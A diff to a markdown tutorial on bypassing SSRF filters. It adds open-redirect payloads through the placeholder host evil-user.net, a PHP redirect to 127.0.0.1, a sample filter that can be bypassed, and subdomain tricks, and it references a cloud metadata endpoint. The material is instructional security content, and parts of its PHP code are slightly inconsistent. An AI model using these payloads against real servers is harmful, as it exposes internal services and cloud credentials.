@@ -238,31 +238,64 @@ vulnerablesite.com/file/?url=http://169.254.169.254/metadata/instance/network/in
 ![](https://miro.medium.com/max/875/0*zK5DVGUaafUFrnAq.JPG)
 
 
+
+## Bypassing SSRF filters (Whitelists)
+- Whitelists are generally harder to bypass because they are by default, stricter than blacklists. But it is possible if there is an open redirect vulnerability within the whitelisted domains.
+- If you could find an open redirect, you can request a whitelisted URL that redirects to an internal URL.
+- If the whitelist is not correctly implemented (eg. via poorly designed regex), it could also be bypassed by using making a subdomain or directory as the whitelisted domain name (eg. victim.com.attacker.com or attacker.com/victim.com).
+
 ## Bypassing SSRF filters via open redirection
-
-- It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an open redirection vulnerability.
-
-- In the preceding SSRF example, suppose the user-submitted URL is strictly validated to prevent malicious exploitation of the SSRF behavior. However, the application whose URLs are allowed contains an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.
+So you’ve found a feature on a web application that fetches external resources. You’re able to pull content from all sorts of external sites and there doesn’t seem to be any restrictions on the file type that you can request. The application displays everything right back at you. 
 
 For example, suppose the application contains an open redirection vulnerability in which the following URL:
 
 `/product/nextProduct?currentProductId=6&path=http://evil-user.net`
-
 returns a redirection to:
 
 `http://evil-user.net`
 
+Everything on this endpoint is screaming at you, that it is ripe for SSRF! So you start typing in the magic digits: 127.0.0.1. But a mere second later, the server comes back with an unexpected response:
+
+`Error. Requests to this address are not allowed. Please try again.`
+
+What do you do now?
+
+> First, What is HTTP Redirect? <br></br>
+> The request with 302, 301 Response and Location headers, etc., it means that an HTTP page is navigated to another page before it is rendered.
+
+It is sometimes possible to bypass any kind of filter-based defenses by exploiting an open redirection vulnerability.
+
 You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
 
-```php
-POST /product/stock HTTP/1.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 118
+Make the server request to URL that you have control (http://evil-user.net/ssrf_bypass.php) that redirects us to the blacklisted address. For example, you can host a file with the following content on your web server:
 
-stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```php
+<?php header(“location: http://127.0.0.1"); ?>
+
+```
+So our payload must be like this:
+`/product/nextProduct?currentProductId=6&path=http://evil-user.net/ssrf_bypass.php`
+
+There is one condition. This is used as a bypass method when the verification logic is looking at URL pattern or domain information, without redirect processing. For example, let's say we have code like this:
+```php
+<?php
+
+function protect_ssrf($data){
+  if(strpos($data,"127.0.0.1") !== false){
+    exit();
+  }
+}
+
+function getHtml($url, $post = null) {
+    protect_ssrf($url);
+    header("Location: $url");
+}
+
+echo getHtml($_GET['q']);
+?>
 ```
 
-This SSRF exploit works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing. 
+This SSRF exploit works because the application first validates that the supplied URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.
 
 - - - -
 
@@ -281,6 +314,7 @@ Setup !
 ## References:
 https://mf-akbar.medium.com/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e <br></br>
 https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5 <br></br>
+https://vickieli.medium.com/ <br></br>
 https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf <br></br>
 https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 <br></br>
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-exploitation-via-url-scheme <br></br>
